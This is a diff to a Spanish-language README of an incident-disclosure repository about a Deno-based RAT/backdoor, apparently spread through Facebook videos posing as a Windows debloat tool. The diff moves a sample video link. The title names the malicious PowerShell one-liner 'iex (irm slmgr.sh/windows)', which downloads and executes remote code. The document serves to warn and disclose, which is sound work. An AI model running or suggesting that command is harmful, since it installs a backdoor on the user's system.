@@ -1,15 +1,11 @@
+
+Video de muestra de lo que aparece en facebook:
+https://github.com/user-attachments/assets/bae6e11a-1eb8-440e-87b8-af8da65d5e9f
+
 # deno-backdoor-slmgr-sh-windows-incident
 incidente y declaración para evidenciar el malware existente fechado en 10/07/2026
 
 # Incidente de malware usando `iex (irm slmgr.sh/windows)` – Deno RAT / Backdoor
-
-Video de muestra de lo que aparece en facebook:
-
-<div align="center">
-  <video src="https://github.com/djklmr2025/deno-backdoor-slmgr-sh-windows-incident/raw/main/desbloat%20w11.mp4" width="100%" controls>
-  </video>
-</div>
-
 
 ## Resumen
 
